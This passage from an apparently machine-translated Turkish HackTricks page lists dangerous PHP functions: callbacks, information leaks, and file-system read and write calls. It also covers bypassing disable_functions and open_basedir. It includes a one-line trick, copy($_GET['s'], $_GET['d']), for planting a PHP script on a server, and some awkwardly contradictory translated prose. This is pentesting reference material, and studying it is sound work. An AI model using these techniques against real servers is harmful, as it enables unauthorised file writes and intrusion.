'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```

### Bilgi Sızdırma

Bu işlev çağrılarının çoğu sızıntı noktaları değildir. Ancak, dönen verilerden herhangi biri saldırgan tarafından görülebilirse bir zayıflık olabilir. Eğer bir saldırgan phpinfo() işlevini görebiliyorsa, kesinlikle bir zayıflık vardır.

```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

### Diğer

Bu bölümde, PHP'de kullanışlı olabilecek bazı işlevlerin nasıl devre dışı bırakılabileceğini ve `open_basedir` kısıtlamasını nasıl atlayabileceğinizi öğreneceksiniz.

#### `disable_functions` İşlevini Devre Dışı Bırakma

`disable_functions` yönergesi, belirli PHP işlevlerinin kullanımını devre dışı bırakmanıza olanak tanır. Bu, bir sunucuda çalışan bir PHP uygulamasının güvenliğini artırmak için yaygın olarak kullanılır. Ancak, bu işlevlerin devre dışı bırakılması, bir saldırganın hedef sistemdeki zafiyetleri istismar etmesini zorlaştırır.

Bir saldırgan, `disable_functions` yönergesinin yapılandırıldığı bir sunucuda, devre dışı bırakılan işlevlerin yerine geçebilecek alternatif yöntemler kullanabilir. Bu, saldırganın hedef sistemdeki zafiyetleri istismar etmesine olanak tanır.

#### `open_basedir` Kısıtlamasını Atlatma

`open_basedir` yönergesi, bir PHP betiğinin erişebileceği dizinleri sınırlamak için kullanılır. Bu, bir sunucuda çalışan bir PHP uygulamasının güvenliğini artırmak için yaygın olarak kullanılır. Ancak, bu kısıtlama, bir saldırganın hedef sistemdeki hassas dosyalara erişmesini zorlaştırır.

Bir saldırgan, `open_basedir` yönergesinin yapılandırıldığı bir sunucuda, bu kısıtlamayı atlatmak için çeşitli yöntemler kullanabilir. Bu, saldırganın hedef sistemdeki hassas dosyalara erişmesine olanak tanır.

Bu bölümde, `disable_functions` işlevini devre dışı bırakma ve `open_basedir` kısıtlamasını atlatma tekniklerini öğreneceksiniz. Bu teknikler, bir saldırganın hedef sistemdeki zafiyetleri istismar etmesine olanak tanır.

```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

### Dosya Sistemi Fonksiyonları

RATS'e göre, php'deki tüm dosya sistemi fonksiyonları tehlikelidir. Bunlardan bazıları saldırgan için çok kullanışlı görünmeyebilir. Diğerleri düşündüğünüzden daha kullanışlıdır. Örneğin, allow\_url\_fopen=On ise bir url, bir dosya yolu olarak kullanılabilir, bu nedenle copy($\_GET\['s'], $\_GET\['d']); çağrısı, bir PHP betiğini sistemin herhangi bir yerine yüklemek için kullanılabilir. Ayrıca, bir site GET ile gönderilen bir isteğe karşı savunmasızsa, tüm bu dosya sistemi fonksiyonları, saldırıyı başka bir sunucuya yönlendirmek için sunucunuz aracılığıyla istismar edilebilir.

**Açık dosya sistemi işleyicisi**

```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```

**Dosya sistemine yazma (kısmen okuma ile birlikte)**

Bazı durumlarda, hedef web uygulamasının dosya sistemine yazma yeteneğine sahip olmak isteyebilirsiniz. Bu, hedef sisteme zararlı bir dosya yüklemek veya mevcut bir dosyayı değiştirmek için kullanılabilir. Aşağıda, dosya sistemine yazma işlemini gerçekleştirmek için kullanılabilecek bazı PHP işlevlerini bulacaksınız.

1. `file_put_contents()`: Bu işlev, belirtilen dosyaya veri yazmanızı sağlar. İşlev, dosyanın var olup olmadığını kontrol eder ve dosya yoksa otomatik olarak oluşturur. Örneğin:

```php
file_put_contents('/path/to/file.txt', 'Bu dosyaya yazıldı.');
```

2. `fopen()`, `fwrite()`, `fclose()`: Bu işlevler, dosyayı açmak, veri yazmak ve dosyayı kapatmak için kullanılır. Örneğin:

```php
$file = fopen('/path/to/file.txt', 'w');
fwrite($file, 'Bu dosyaya yazıldı.');
fclose($file);
```

3. `file()`: Bu işlev, belirtilen dosyanın içeriğini bir dizi olarak döndürür. Bu diziye veri ekleyerek dosyaya yazabilirsiniz. Örneğin:

```php
$fileContent = file('/path/to/file.txt');
$fileContent[] = 'Bu dosyaya yazıldı.';
file_put_contents('/path/to/file.txt', implode("\n", $fileContent));
```

Bu işlevler, hedef web uygulamasının dosya sistemine yazma yeteneğine sahip olduğunuzda kullanışlı olabilir. Ancak, bu tür işlemleri gerçekleştirirken dikkatli olmalı ve yasal sınırlar içinde kalmalısınız.

```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```

**Dosya sisteminden okuma yapma**

Bazı durumlarda, bir web uygulamasının belirli bir dizindeki dosyaları okuması gerekebilir. Bu, uygulamanın işlevselliğini test etmek veya hedef sistemdeki hassas verilere erişmek için kullanılabilir. Aşağıda, dosya sisteminden okuma yapmak için kullanılan bazı PHP işlevlerini bulabilirsiniz:

* `file_get_contents()`: Bu işlev, belirtilen dosyanın içeriğini bir dize olarak döndürür. Örneğin:

```php
$fileContent = file_get_contents('/path/to/file.txt');
echo $fileContent;
```

* `fopen()` ve `fread()`: Bu işlevler, bir dosyayı açmak ve içeriğini okumak için kullanılır. Örneğin:

```php
$fileHandle = fopen('/path/to/file.txt', 'r');
$fileContent = fread($fileHandle, filesize('/path/to/file.txt'));
fclose($fileHandle);
echo $fileContent;
```

Bu işlevler, web uygulamasının çalıştığı sunucunun dosya sistemindeki dosyalara erişim izni olduğunda kullanılabilir. Ancak, bazı durumlarda, `disable_functions` veya `open_basedir` gibi güvenlik önlemleri bu işlevlerin kullanımını sınırlayabilir. Bu durumda, alternatif yöntemler veya zayıflıklar araştırılmalıdır.

```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
